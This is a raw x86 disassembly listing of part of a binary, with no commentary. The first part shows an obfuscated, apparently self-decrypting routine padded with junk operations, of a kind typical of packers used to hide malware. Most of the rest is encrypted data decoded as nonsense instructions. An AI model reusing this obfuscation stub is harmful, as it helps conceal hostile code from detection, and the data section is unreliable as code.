  4038e9:	add    ch,BYTE PTR [eax]
  4038eb:	adc    edi,DWORD PTR [esi+0x77]
  4038ee:	xchg   esp,eax
  4038ef:	repnz rol DWORD PTR [edx],cl
  4038f2:	sbb    al,0xe5
  4038f4:	push   0x7d6e2d73
  4038f9:	and    esi,ebp
  4038fb:	push   eax
  4038fc:	loope  0x40394c
  4038fe:	and    BYTE PTR [edi-0x743a567e],bh
  403904:	dec    ebp
  403905:	lock sub DWORD PTR ds:0x426eb9,0x426ea1
  403910:	xor    eax,esi
  403912:	adc    DWORD PTR ds:0x426f2d,0x426f05
  40391c:	xor    ecx,esi
  40391e:	sub    eax,ecx
  403920:	mov    DWORD PTR ds:0x426f15,0x36a1
  40392a:	cmp    edx,eax
  40392c:	jne    0x403b2f
  403932:	mov    eax,DWORD PTR [ebp-0xc]
  403935:	and    DWORD PTR ds:0x426ee1,0x0
  40393f:	jmp    0x403951
  403944:	mov    ecx,DWORD PTR ds:0x426ee1
  40394a:	inc    ecx
  40394b:	mov    DWORD PTR ds:0x426ee1,ecx
  403951:	cmp    DWORD PTR ds:0x426ee1,0x16
  403958:	jae    0x40399f
  40395e:	cmp    DWORD PTR ds:0x426ee1,0xb
  403965:	jge    0x40399f
  40396b:	jmp    0x403980
  403970:	push   0x37fd
  403975:	push   0x426042
  40397a:	call   DWORD PTR ds:0x430a44
  403980:	cmp    DWORD PTR ds:0x426ee1,0xa
  403987:	jne    0x40399a
  40398d:	mov    ecx,DWORD PTR ds:0x426ee1
  403993:	inc    ecx
  403994:	mov    DWORD PTR ds:0x426ee1,ecx
  40399a:	jmp    0x403944
  40399f:	mov    dl,BYTE PTR [eax+ebx*1+0x801]
  4039a6:	mov    eax,DWORD PTR [ebp-0x28]
  4039a9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039ac:	xor    eax,esi
  4039ae:	and    DWORD PTR ds:0x426f09,0x426e85
  4039b8:	xor    ecx,esi
  4039ba:	adc    DWORD PTR ds:0x426e91,0x426ed5
  4039c4:	add    eax,edi
  4039c6:	sbb    DWORD PTR ds:0x426ef1,0x426e99
  4039d0:	add    ecx,edi
  4039d2:	mov    DWORD PTR ds:0x426ed1,0x117e
  4039dc:	mov    BYTE PTR [ebp-0x21],dl
  4039df:	cmp    eax,ecx
  4039e1:	mov    DWORD PTR ds:0x426ea5,0x5630
  4039eb:	jae    0x403af5
  4039f1:	lea    ecx,[eax-0x3272fa]
  4039f7:	and    DWORD PTR ds:0x426e99,0x0
  403a01:	jmp    0x403a13
  403a06:	mov    edx,DWORD PTR ds:0x426e99
  403a0c:	inc    edx
  403a0d:	mov    DWORD PTR ds:0x426e99,edx
  403a13:	cmp    DWORD PTR ds:0x426e99,0x1a
  403a1a:	jae    0x403a48
  403a20:	cmp    DWORD PTR ds:0x426e99,0x24
  403a27:	jle    0x403a48
  403a2d:	jmp    0x403a43
  403a32:	push   DWORD PTR [ebp-0x20]
  403a35:	push   DWORD PTR [ebp-0xc]
  403a38:	push   0x18cc
  403a3d:	call   DWORD PTR ds:0x430a18
  403a43:	jmp    0x403a06
  403a48:	mov    DWORD PTR [ebp-0x14],ecx
  403a4b:	dec    DWORD PTR ds:0x426e89
  403a51:	mov    edx,DWORD PTR [ebp-0x14]
  403a54:	or     DWORD PTR ds:0x426f29,0x426e89
  403a5e:	xor    edx,esi
  403a60:	xor    DWORD PTR ds:0x426ed9,0x426ed5
  403a6a:	add    edx,0x7f55d8fb
  403a70:	lea    ecx,[ebp+eax*4-0xb4]
  403a77:	mov    DWORD PTR ds:0x426e81,0x3e21
  403a81:	mov    DWORD PTR [ecx],edx
  403a83:	mov    DWORD PTR ds:0x426ecd,0x70c2
  403a8d:	mov    edx,DWORD PTR [ecx]
  403a8f:	cmp    edx,0x244ecb9a
  403a95:	jbe    0x403ab0
  403a9b:	add    DWORD PTR ds:0x426edd,0x36b2
  403aa5:	add    DWORD PTR [ecx],0x405fcd9
  403aab:	jmp    0x403ab6
  403ab0:	add    DWORD PTR [ecx],0xfdaf4327
  403ab6:	mov    ecx,DWORD PTR [ebp-0x18]
  403ab9:	xor    ecx,esi
  403abb:	sbb    DWORD PTR ds:0x426f11,0x426ef1
  403ac5:	inc    eax
  403ac6:	inc    DWORD PTR [ebp-0x14]
  403ac9:	sbb    DWORD PTR ds:0x426eb1,0x426ef5
  403ad3:	add    ecx,edi
  403ad5:	mov    DWORD PTR ds:0x426ee5,0x502
  403adf:	cmp    eax,ecx
  403ae1:	jb     0x403a4b
  403ae7:	mov    eax,ds:0x426f1d
  403aec:	xor    DWORD PTR ds:0x426ee9,eax
  403af2:	mov    dl,BYTE PTR [ebp-0x21]
  403af5:	add    eax,DWORD PTR ds:0x426ea1
  403afb:	mov    eax,DWORD PTR [ebp-0x34]
  403afe:	xor    al,0xb3
  403b00:	not    DWORD PTR ds:0x426f0d
  403b06:	mov    cl,0x6
  403b08:	sub    cl,al
  403b0a:	add    dl,cl
  403b0c:	sub    DWORD PTR ds:0x426ed9,0x16fc
  403b16:	mov    ecx,DWORD PTR [ebp-0x1c]
  403b19:	xor    cl,0xb3
  403b1c:	sub    cl,0x6
  403b1f:	ror    dl,cl
  403b21:	xor    eax,eax
  403b23:	or     eax,eax
  403b25:	mov    eax,DWORD PTR [ebp-0xc]
  403b28:	mov    BYTE PTR [eax+ebx*1+0x801],dl
  403b2f:	mov    eax,DWORD PTR [ebp-0xc]
  403b32:	mov    ecx,DWORD PTR [ebp-0x28]
  403b35:	xor    DWORD PTR ds:0x426f11,0x426f09
  403b3f:	sub    eax,edi
  403b41:	xor    DWORD PTR ds:0x426eb5,0x426efd
  403b4b:	xor    eax,esi
  403b4d:	cmp    eax,ecx
  403b4f:	jne    0x403b79
  403b55:	mov    eax,DWORD PTR [ebp-0x8]
  403b58:	mov    ecx,DWORD PTR [ebp-0x10]
  403b5b:	xor    eax,esi
  403b5d:	xor    ecx,esi
  403b5f:	sub    eax,ecx
  403b61:	sub    eax,edi
  403b63:	xor    eax,esi
  403b65:	mov    DWORD PTR [ebp-0x8],eax
  403b68:	mov    eax,DWORD PTR [ebp-0x10]
  403b6b:	xor    eax,esi
  403b6d:	mov    ecx,0xffcd8d87
  403b72:	sub    ecx,eax
  403b74:	jmp    0x403b88
  403b79:	mov    eax,DWORD PTR [ebp-0x10]
  403b7c:	xor    eax,esi
  403b7e:	mov    ecx,0xffcd8d06
  403b83:	sub    ecx,eax
  403b85:	add    ecx,DWORD PTR [ebp-0xc]
  403b88:	mov    DWORD PTR [ebp-0xc],ecx
  403b8b:	mov    eax,DWORD PTR [ebp-0x8]
  403b8e:	cmp    eax,0xf89c85b5
  403b93:	jne    0x40140a
  403b99:	mov    DWORD PTR [ebp-0x34],0xb
  403ba0:	mov    ecx,DWORD PTR [ebp+0x8]
  403ba3:	xor    ecx,esi
  403ba5:	add    ecx,edi
  403ba7:	jmp    0x408537
  403bac:	lea    eax,[ecx+ebx*1]
  403baf:	jmp    0x405f47
  403bb4:	lock and dl,ch
  403bb7:	pop    ebp
  403bb8:	pop    ecx
  403bb9:	ins    BYTE PTR es:[edi],dx
  403bba:	js     0x403bf2
  403bbc:	mov    ds:0x18c4e32d,al
  403bc1:	shl    BYTE PTR [ebx+0x7b9cf416],1
  403bc7:	jnp    0x403bbd
  403bc9:	pushf  
  403bca:	jnp    0x403c47
  403bcc:	cmp    dl,bl
  403bce:	jmp    0x54e9315b
  403bd3:	push   ds
  403bd4:	cwde   
  403bd5:	sbb    BYTE PTR [ebp-0x41],ch
  403bd8:	xor    al,0xf3
  403bda:	xchg   DWORD PTR [ebp-0x2f11fd06],eax
  403be0:	outs   dx,BYTE PTR ds:[esi]
  403be1:	cs push 0x7d605b15
  403be7:	les    eax,FWORD PTR [edx+0x1f703f33]
  403bed:	scas   eax,DWORD PTR es:[edi]
  403bee:	arpl   WORD PTR [ecx],sp
  403bf0:	xchg   esp,eax
  403bf1:	and    eax,0xe003515a
  403bf7:	or     dh,cl
  403bf9:	daa    
  403bfa:	in     eax,dx
  403bfb:	fcomp  QWORD PTR [ecx-0x17281bc8]
  403c01:	outs   dx,BYTE PTR ds:[esi]
  403c02:	push   eax
  403c03:	push   esp
  403c04:	loope  0x403bdf
  403c06:	add    dl,ah
  403c08:	push   edi
  403c09:	iret   
  403c0a:	adc    al,0x1e
  403c0c:	fwait
  403c0d:	xor    al,BYTE PTR [esi+ebx*4]
  403c10:	das    
  403c11:	inc    ebp
  403c12:	push   ecx
  403c13:	(bad)  
  403c14:	xchg   ebp,eax
  403c15:	repz cmp DWORD PTR [ecx+ebp*2],edx
  403c19:	push   DWORD PTR [ebx-0x5b333079]
  403c1f:	sub    al,0xe3
  403c21:	jae    0x403c97
  403c23:	in     al,dx
  403c24:	mov    cl,0x64
  403c26:	test   BYTE PTR [ebx+edx*1-0x252195d5],dh
  403c2d:	jb     0x403c66
  403c2f:	inc    ecx
  403c30:	jp     0x403c9e
  403c32:	loopne 0x403cb0
  403c34:	mov    dl,0x5e
  403c36:	jp     0x403bf2
  403c38:	mov    ch,BYTE PTR [ebx]
  403c3a:	jb     0x403c27
  403c3c:	mov    DWORD PTR [eax],eax
  403c3e:	pop    ecx
  403c3f:	(bad)  
  403c40:	pop    ds
  403c41:	fcmove st,st(3)
  403c43:	pop    edx
  403c44:	lds    edi,FWORD PTR ds:0x4ddc5868
  403c4a:	push   edi
  403c4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c4c:	or     ebp,DWORD PTR [edi]
  403c4e:	sbb    edi,ecx
  403c50:	mov    ds:0x7550f8d6,eax
  403c55:	push   edi
  403c56:	ret    
  403c57:	and    ah,al
  403c59:	mov    ecx,0xf8f1249f
  403c5e:	call   0x4753c735
  403c63:	into   
  403c64:	jg     0x403c70
  403c66:	rcl    DWORD PTR [esi-0x26b3e687],cl
  403c6c:	pop    ss
  403c6d:	pusha  
  403c6e:	xchg   ebx,eax
  403c6f:	mov    dh,0x2e
  403c71:	aas    
  403c72:	mov    ecx,DWORD PTR [esi+0x40de8dc2]
  403c78:	xlat   BYTE PTR ds:[ebx]
  403c79:	int    0x60
  403c7b:	jge    0x403c62
  403c7d:	stos   BYTE PTR es:[edi],al
  403c7e:	lock cmp esp,DWORD PTR [eax+ecx*1+0x2]
  403c83:	les    eax,FWORD PTR [edi-0x11273143]
  403c89:	mov    edi,0x53d0abd0
  403c8e:	ins    BYTE PTR es:[edi],dx
  403c8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c90:	adc    BYTE PTR [ecx],dh
  403c92:	int3   
  403c93:	lock mov esi,0xa9a47e38
  403c99:	sbb    bl,BYTE PTR [ecx]
  403c9b:	ss cdq 
  403c9d:	popa   
  403c9e:	or     cl,BYTE PTR [eax]
  403ca0:	mov    gs,WORD PTR [esi+0x66]
  403ca3:	mov    ds:0x432c016c,al
  403ca8:	inc    eax
  403ca9:	mov    ecx,0x9e8bfdc6
  403cae:	arpl   WORD PTR [edx+0x20],sp
  403cb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cb2:	int    0xa8
  403cb4:	sub    al,0x33
  403cb6:	cmp    BYTE PTR [edx-0x36],bl
  403cb9:	cmp    eax,0xa18305b1
  403cbe:	mov    cl,0x3
  403cc0:	lock sbb al,BYTE PTR ds:0xac299e3f
  403cc7:	cmp    al,0x8c
  403cc9:	aad    0x7a
  403ccb:	jle    0x403d07
  403ccd:	jl     0x403c84
  403ccf:	sbb    bl,ah
  403cd1:	pop    ss
  403cd2:	and    edx,DWORD PTR [eax]
  403cd4:	pop    ds
  403cd5:	jbe    0x403cf8
  403cd7:	push   cs
  403cd8:	(bad)  
  403cd9:	mov    ds:0x97894b11,eax
  403cde:	arpl   WORD PTR [ecx+0x3e],bp
  403ce1:	jo     0x403d1c
  403ce3:	fbstp  TBYTE PTR [esi+0x5a]
  403ce6:	mov    ebp,0x52e68aed
  403ceb:	dec    edi
  403cec:	jg     0x403cbe
  403cee:	(bad)  
  403cef:	sub    esp,DWORD PTR ds:0x528d0b7e
  403cf5:	sub    eax,0x6dcf0caa
  403cfa:	lds    esi,FWORD PTR [ecx-0x5d]
  403cfd:	or     eax,0xa1420500
  403d02:	xor    DWORD PTR [ebx+0x4d93a503],esp
  403d08:	(bad)  
  403d09:	dec    ebx
  403d0a:	xchg   esp,eax
  403d0b:	add    ecx,DWORD PTR [eax]
  403d0d:	lock ins BYTE PTR es:[edi],dx
  403d0f:	push   edx
  403d10:	pmaxub mm4,QWORD PTR [eax+0x12930c98]
  403d17:	pop    ebx
  403d18:	ret    
  403d19:	adc    BYTE PTR [ebp-0x13],bh
  403d1c:	xor    BYTE PTR [ebp+0x7479c661],ch
  403d22:	sbb    ecx,DWORD PTR ds:0x134c5d89
  403d28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d29:	popa   
  403d2a:	push   eax
  403d2b:	loope  0x403d31
  403d2d:	or     al,0xb8
  403d2f:	adc    ecx,DWORD PTR [edi-0x65b44d74]
  403d35:	test   BYTE PTR [edi+ecx*2],ah
  403d38:	mov    ah,cl
  403d3a:	xchg   edi,eax
  403d3b:	sub    ecx,edx
  403d3d:	jl     0x403cd6
  403d3f:	rol    BYTE PTR [ebp+eax*8-0x7f],0x49
  403d44:	adc    BYTE PTR [edx-0x798619d],bl
  403d4a:	test   eax,0x991c0e62
  403d4f:	xchg   ebx,edx
  403d51:	les    esi,FWORD PTR [edi]
  403d53:	mov    edi,DWORD PTR [ebp-0x75d2f72e]
  403d59:	mul    dl
  403d5b:	daa    
  403d5c:	retf   0x6652
  403d5f:	xchg   edi,eax
  403d60:	sub    esp,ebx
  403d62:	jbe    0x403de2
  403d64:	test   al,0x9e
  403d66:	jae    0x403dd6
  403d68:	adc    BYTE PTR [ebx],dl
  403d6a:	das    
  403d6b:	pop    ss
  403d6c:	aaa    
  403d6d:	sbb    BYTE PTR [eax-0x69],al
  403d70:	mov    ah,0x1
  403d72:	daa    
  403d73:	cld    
  403d74:	add    dl,BYTE PTR [esp+ecx*8]
  403d77:	adc    ecx,DWORD PTR [ebx+0x2056ed0d]
  403d7d:	int3   
  403d7e:	stos   BYTE PTR es:[edi],al
  403d7f:	je     0x403d14
  403d81:	add    DWORD PTR [edi+ebx*8+0xbc41105],esp
  403d88:	sub    cl,BYTE PTR [esp+edx*2-0x2a1273e4]
  403d8f:	sub    DWORD PTR [esi-0x55],eax
  403d92:	loope  0x403d89
  403d94:	or     edx,DWORD PTR [ebx]
  403d96:	retf   0x44c2
  403d99:	mov    bl,0x80
  403d9b:	inc    esp
  403d9c:	out    dx,al
  403d9d:	mov    bl,0x1f
  403d9f:	rcl    BYTE PTR [edx+0x782dd6ea],1
  403da5:	mov    dh,0x47
  403da7:	enter  0xdff2,0x29
  403dab:	pop    edi
  403dac:	pop    ebp
  403dad:	mov    al,0x80
  403daf:	lods   eax,DWORD PTR ds:[esi]
  403db0:	lock or esi,DWORD PTR [edi-0x132c4656]
  403db7:	popf   
  403db8:	mov    di,0x8c96
  403dbc:	idiv   DWORD PTR [ecx]
  403dbe:	push   ecx
  403dbf:	sub    edx,0xfffffff9
  403dc2:	adc    al,ah
  403dc4:	sbb    edi,DWORD PTR [ebp+0x74]
  403dc7:	mov    dl,0xad
  403dc9:	jmp    DWORD PTR [eax]
  403dcb:	push   ecx
  403dcc:	mov    edx,0x94f70f1d
  403dd1:	mov    al,0xd0
  403dd3:	pop    edx
  403dd4:	iret   
  403dd5:	adc    dl,BYTE PTR [edi-0x13546971]
  403ddb:	dec    esi
  403ddc:	call   0x9573d87c
  403de1:	or     esp,DWORD PTR [edx+0x15]
  403de4:	xor    eax,0x3da99800
  403de9:	add    al,0x8a
  403deb:	mov    bl,0x56
  403ded:	das    
  403dee:	pop    es
  403def:	and    DWORD PTR [edi-0x79bb25b3],0x47
  403df6:	mov    bl,0xcc
  403df8:	aam    0xf2
  403dfa:	cmc    
  403dfb:	and    al,0xbc
  403dfd:	sbb    BYTE PTR [esi+0x4a91e714],0xe4
  403e04:	iret   
  403e05:	mov    BYTE PTR [ecx],bh
  403e07:	mov    cl,0x98
  403e09:	jmp    0x6c95:0x70cefb2
  403e10:	mov    ch,0xc6
  403e12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e13:	cdq    
  403e14:	xor    ebx,DWORD PTR [edx-0x7f669449]
  403e1a:	es pop es
  403e1c:	mov    BYTE PTR [ebx+0x4074ccf1],al
  403e22:	mov    al,0x18
  403e24:	in     al,dx
  403e25:	or     al,0x42
  403e27:	clc    
  403e28:	dec    ecx
  403e29:	mov    esi,0xafa49d13
  403e2e:	xchg   esp,eax
  403e2f:	add    esp,DWORD PTR [esi-0x18]
  403e32:	xor    BYTE PTR [ecx+0x5672b0ac],al
  403e38:	push   ebp
  403e39:	sbb    bh,BYTE PTR [ebp-0x28]
  403e3c:	cld    
  403e3d:	push   edx
  403e3e:	push   ds
  403e3f:	push   0xa29763a0
  403e44:	mov    ebp,0x8e5c9b76
  403e49:	jmp    0xd7d3b14e
  403e4e:	das    
  403e4f:	lock and al,0x6b
  403e52:	dec    ecx
  403e53:	push   cs
  403e54:	cmp    eax,esp
  403e56:	aad    0x8
  403e58:	mov    esi,DWORD PTR [eax]
  403e5a:	push   0xb73f633f
  403e5f:	push   esi
  403e60:	dec    ebx
  403e61:	cs pop edi
  403e63:	hlt    
  403e64:	inc    edi
  403e65:	cmp    al,0x33
  403e67:	gs nop
  403e69:	xchg   edx,eax
  403e6a:	retf   
  403e6b:	adc    eax,0x4db77cf3
  403e70:	push   edi
  403e71:	jg     0x403e2d
  403e73:	jmp    0xb3335eee
  403e78:	ins    DWORD PTR es:[edi],dx
  403e79:	loopne 0x403ec6
  403e7b:	jns    0x403edd
  403e7d:	repz js 0x403eb5
  403e80:	fadd   DWORD PTR [ecx]
  403e82:	fucom  st(4)
  403e84:	mov    ecx,0xdd35d940
  403e89:	mov    ch,dh
  403e8b:	loopne 0x403e5f
  403e8d:	inc    ebp
  403e8e:	mov    eax,ds:0x6b0cc543
  403e93:	fild   QWORD PTR [ebx+0x1c]
  403e96:	xchg   edx,eax
  403e97:	inc    esi
  403e98:	imul   edx,DWORD PTR [ecx-0x13],0x4b
  403e9c:	push   eax
  403e9d:	xchg   ebp,eax
  403e9e:	pusha  
  403e9f:	mul    BYTE PTR [ebp-0x23]
  403ea2:	rcl    esp,1
  403ea4:	mov    bh,0xed
  403ea6:	xchg   BYTE PTR [esi+0xb],bh
  403ea9:	repnz add ch,bh
  403eac:	repz pushw 0x5f
  403eb0:	dec    ebx
  403eb1:	ins    BYTE PTR es:[edi],dx
  403eb2:	mov    eax,ss:0x61d00504
  403eb8:	sbb    eax,0x1b04f049
  403ebd:	inc    eax
  403ebe:	in     eax,dx
  403ebf:	sub    esi,DWORD PTR [ebp+0x34]
  403ec2:	dec    edi
  403ec3:	mov    edi,0xd2437f15
  403ec8:	jae    0x403f2e
  403eca:	push   esi
  403ecb:	iret   
  403ecc:	inc    esi
  403ecd:	cwde   
  403ece:	sbb    DWORD PTR [ebp-0x7da25892],edx
  403ed4:	stc    
  403ed5:	fistp  DWORD PTR [edi+0x6c4e6140]
  403edb:	ja     0x403e73
  403edd:	(bad)  
  403edf:	ret    0x8e82
  403ee2:	mov    ds:0x1138eec8,eax
  403ee7:	in     al,dx
  403ee8:	cmp    al,0x74
  403eea:	nop
  403eeb:	clc    
  403eec:	cmp    DWORD PTR [edx],edi
  403eee:	jge    0x403f2f
  403ef0:	pop    esp
  403ef1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ef2:	stos   BYTE PTR es:[edi],al
  403ef3:	fs (bad) 
  403ef5:	out    dx,eax
  403ef6:	test   al,0x20
  403ef8:	adc    bl,ch
  403efa:	or     ch,bh
  403efc:	or     cl,BYTE PTR [edi+0x46f699af]
  403f02:	or     eax,0x14d939e
  403f07:	pop    esi
  403f08:	jl     0x403f77
  403f0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f0b:	push   ebx
  403f0c:	mov    fs,WORD PTR [ebp-0x6d]
  403f0f:	shr    BYTE PTR [edi+0x5b],0x97
  403f13:	lods   al,BYTE PTR ds:[esi]
  403f14:	inc    eax
  403f15:	jl     0x403ed6
  403f17:	icebp  
  403f18:	mov    bl,0x53
  403f1a:	sub    al,BYTE PTR [eax]
  403f1c:	add    ebx,edi
  403f1e:	dec    esi
  403f1f:	repnz mov eax,0x2581b1f0
  403f25:	shr    DWORD PTR [eax],cl
  403f27:	arpl   WORD PTR [eax+0x6441dbbc],ax
  403f2d:	adc    eax,0xcd7a2c54
  403f32:	push   ebx
  403f33:	into   
  403f34:	mov    bl,0x1e
  403f36:	fadd   DWORD PTR [esi-0x6ac12985]
  403f3c:	ja     0x403fa9
  403f3e:	pop    ds
  403f3f:	ds aad 0xca
  403f42:	jle    0x403f8b
  403f44:	jo     0x403f4d
  403f46:	ins    BYTE PTR es:[edi],dx
  403f47:	shl    DWORD PTR [edx],1
  403f49:	int3   
  403f4a:	(bad)  
  403f4b:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  403f4d:	jno    0x403fb4
  403f4f:	js     0x403fa5
  403f51:	lods   al,BYTE PTR ds:[esi]
  403f52:	dec    eax
  403f53:	cmp    al,0xc8
  403f55:	cld    
  403f56:	std    
  403f57:	and    cl,BYTE PTR [esi-0x51]
  403f5a:	retf   
  403f5b:	add    edx,DWORD PTR [edi+ebx*1+0x69]
  403f5f:	pop    ecx
  403f60:	ss aas 
  403f62:	cdq    
  403f63:	nop
  403f64:	push   0xb478053a
  403f69:	retf   0x867f
  403f6c:	aad    0xff
  403f6e:	addr16 cld 
  403f70:	mov    DWORD PTR [ecx+ebp*8+0x6e],0x1f9f8f6b
  403f78:	das    
  403f79:	xchg   ebx,eax
  403f7a:	add    al,0xcf
  403f7c:	sbb    DWORD PTR [edx+0x1f3f59eb],esp
  403f82:	cmp    BYTE PTR [esi],0xaf
  403f85:	cmp    al,BYTE PTR [ebp-0x33]
  403f88:	xchg   edi,eax
  403f89:	and    al,0x47
  403f8b:	ss fwait
  403f8d:	jne    0x403ff8
  403f8f:	hlt    
  403f90:	push   eax
  403f91:	jmp    0x177f6e97
  403f96:	mov    ebx,0x35a6562
  403f9b:	pop    ds
  403f9c:	sahf   
  403f9d:	iret   
  403f9e:	in     al,dx
  403f9f:	inc    esi
  403fa0:	cli    
  403fa1:	sbb    eax,0x7c1582fe
  403fa6:	mov    ecx,0x7355a36d
  403fab:	xchg   esp,eax
  403fac:	or     eax,DWORD PTR ds:0x51af635b
  403fb2:	or     DWORD PTR [ecx],eax
  403fb4:	or     al,0x56
  403fb6:	cmp    DWORD PTR [esi+ecx*8],edx
  403fb9:	jecxz  0x403f74
  403fbb:	mov    ds:0x360580a8,eax
  403fc0:	push   es
  403fc1:	pushf  
  403fc2:	dec    ebx
  403fc3:	and    cl,BYTE PTR [ebx-0x760c5784]
  403fc9:	or     ah,BYTE PTR [edi+eiz*4-0x702a3c1f]
  403fd0:	rcl    DWORD PTR cs:[esi-0x2ef81990],cl
  403fd7:	lods   eax,DWORD PTR ds:[esi]
  403fd8:	dec    BYTE PTR [ecx+0x7bc71262]
  403fde:	in     al,dx
  403fdf:	lock dec esp
  403fe1:	scas   eax,DWORD PTR es:[edi]
  403fe2:	in     al,dx
  403fe3:	hlt    
  403fe4:	push   edi
  403fe5:	adc    al,0x75
  403fe7:	sub    DWORD PTR [ecx+eiz*2],eax
  403fea:	sub    BYTE PTR [eax-0x6],0xf6
  403fee:	cmp    eax,esp
  403ff0:	xchg   DWORD PTR [ecx],esp
  403ff2:	cs xchg ecx,eax
  403ff4:	add    eax,0xafd7bfe5
  403ff9:	repz jb 0x40400c
  403ffc:	out    dx,eax
  403ffd:	dec    edi
  403ffe:	int3   
  403fff:	scas   eax,DWORD PTR es:[edi]
  404000:	jmp    0x40405b
  404002:	sbb    DWORD PTR [edx],ebx
  404004:	outs   dx,DWORD PTR ds:[esi]
  404005:	loope  0x403fb5
  404007:	xchg   BYTE PTR [edi-0x33ca839f],al
  40400d:	je     0x404010
  40400f:	adc    ecx,esp
  404011:	push   ebp
  404012:	in     eax,dx
  404013:	mov    BYTE PTR [ebx],al
  404015:	xor    esi,DWORD PTR [edi]
  404017:	push   0x3a
  404019:	cwde   
  40401a:	push   esp
  40401b:	inc    ebp
  40401c:	jecxz  0x40405a
  40401e:	or     al,0x4a
  404020:	mov    bl,0x3f
  404022:	pmulhw mm7,QWORD PTR [ebx+0x227ad5d4]
  404029:	leave  
  40402a:	push   eax
  40402b:	das    
  40402c:	test   eax,0x2241a940
  404031:	leave  
  404032:	loopne 0x40409a
  404034:	(bad)  
  404035:	xchg   edx,eax
  404036:	mov    esp,0xd09bde44
  40403b:	clc    
  40403c:	test   eax,0xf5ae4a97
  404041:	aad    0x4c
  404043:	test   DWORD PTR [ecx-0x2eef7cc7],esp
  404049:	or     BYTE PTR [edx-0x699d4d0a],dl
  40404f:	pop    edx
  404050:	inc    esi
  404051:	mov    bh,0x84
  404053:	xor    edx,eax
  404055:	push   es
  404056:	push   ebp
  404057:	popa   
  404058:	fist   WORD PTR [edi+0x740bbce2]
  40405e:	hlt    
  40405f:	hlt    
  404060:	sub    bl,ch
  404062:	lock dec edi
  404064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404065:	scas   eax,DWORD PTR es:[edi]
  404066:	adc    ah,BYTE PTR [edx]
  404068:	cmp    bl,dl
  40406a:	mov    ds:0x759d210d,al
  40406f:	inc    edx
  404070:	xchg   edi,eax
  404071:	outs   dx,BYTE PTR ds:[esi]
  404072:	xor    DWORD PTR ds:0xa263b383,esp
  404078:	pop    esi
  404079:	xchg   ecx,eax
  40407a:	in     al,0x66
  40407c:	cmp    ch,BYTE PTR [ebx+0x5fd32592]
  404082:	aaa    
  404083:	rcl    BYTE PTR [edi],cl
  404085:	repnz sbb DWORD PTR [ebx+0x6d],eax
  404089:	pusha  
  40408a:	stos   BYTE PTR es:[edi],al
  40408b:	push   0xffffffd0
  40408d:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40408f:	mov    DWORD PTR [bx+si+0x31],esp
  404093:	bound  esi,QWORD PTR ds:[ecx+0xb900c67]
  40409a:	jns    0x40408a
  40409c:	fist   DWORD PTR [ebx-0x20]
  40409f:	jae    0x4040de
  4040a1:	mov    al,ds:0xb5a91db8
  4040a6:	les    edi,FWORD PTR [ecx+edx*2]
  4040a9:	and    BYTE PTR [edx-0x1b],ah
  4040ac:	xor    ah,dl
  4040ae:	mov    esp,0xcb5daebf
  4040b3:	jmp    0x404109
  4040b5:	lea    ecx,[esi]
  4040b7:	cwde   
  4040b8:	out    dx,eax
  4040b9:	(bad)
  4040bc:	sub    BYTE PTR [esi+0x4f6642ae],0x2d
  4040c3:	cli    
  4040c4:	or     eax,DWORD PTR [esi]
  4040c6:	jb     0x4040dd
  4040c8:	mov    ebx,DWORD PTR [eax-0x699e9f90]
  4040ce:	jns    0x40412c
  4040d0:	retf   0x8d1d
  4040d3:	retf   0x6511
  4040d6:	retfw  0x1536
  4040da:	jmp    0xe530c500
  4040df:	sti    
  4040e0:	ja     0x40415b
  4040e2:	rol    BYTE PTR [ebx+0x12],0x81
  4040e6:	outs   dx,DWORD PTR gs:[esi]
  4040e8:	xchg   ecx,ecx
  4040ea:	xor    al,0x81
  4040ec:	lock sti 
  4040ee:	js     0x4040e2
  4040f0:	inc    ebp
  4040f1:	div    DWORD PTR [ebx]
  4040f3:	in     eax,0xd8
  4040f5:	int    0xe9
  4040f7:	dec    esi
  4040f8:	mov    DWORD PTR [ecx],ecx
  4040fa:	add    al,BYTE PTR [ebx+edx*8-0x797f02e0]
  404101:	pop    ebp
  404102:	push   ebp
  404103:	out    0x95,eax
  404105:	or     BYTE PTR [edx-0x71],0xd
  404109:	jbe    0x4040f5
  40410b:	mov    ds:0x10061ca,eax
  404110:	enter  0x292e,0xab
  404114:	je     0x4040bc
  404116:	add    al,0xd1
  404118:	test   eax,0x91196037
  40411d:	retf   0x8ebe
  404120:	fimul  DWORD PTR [ecx]
  404122:	(bad)  
  404124:	add    BYTE PTR [edi-0x29],0xce
  404128:	xchg   BYTE PTR [esi+0x6640605b],bl
  40412e:	cdq    
  40412f:	or     BYTE PTR [ecx-0x1],0xe5
  404133:	add    esp,DWORD PTR [eax+edi*4+0x44]
  404137:	mov    edx,0x86004cce
  40413c:	sbb    eax,0xb8087aaf
  404141:	mov    WORD PTR [ecx-0x336e5742],es
  404147:	sub    edx,ebx
  404149:	fdivrp st(4),st
  40414b:	fdivr  QWORD PTR [eax+ecx*2]
  40414e:	sti    
  40414f:	add    ch,BYTE PTR [edi]
  404151:	ret    
  404152:	add    al,0x2e
  404154:	mov    bl,0xcc
  404156:	fdiv   QWORD PTR [edx]
  404158:	adc    ebp,edx
  40415a:	data16 cmc 
  40415c:	fadd   QWORD PTR [edi]
  40415e:	(bad)  
  40415f:	std    
  404160:	sub    DWORD PTR [edx-0x69],ebx
  404163:	sbb    al,0xe0
  404165:	(bad)  
  404166:	retf   
  404167:	mov    dh,0x80
  404169:	shl    BYTE PTR [ecx],0x48
  40416c:	mov    al,ds:0x25cc6cee
  404171:	mov    BYTE PTR [ebx-0x7e],ah
  404174:	(bad)  
  404175:	mov    ch,0xaa
  404177:	sbb    DWORD PTR [esi],ebx
  404179:	cmp    al,0xbc
  40417b:	sub    DWORD PTR [esi],ebp
  40417d:	out    dx,eax
  40417e:	mov    dl,bh
  404180:	jmp    0x404116
  404182:	mov    al,ds:0xf4ed7312
  404187:	mov    edx,0x4d36b21e
  40418c:	out    dx,eax
  40418d:	jns    0x40414d
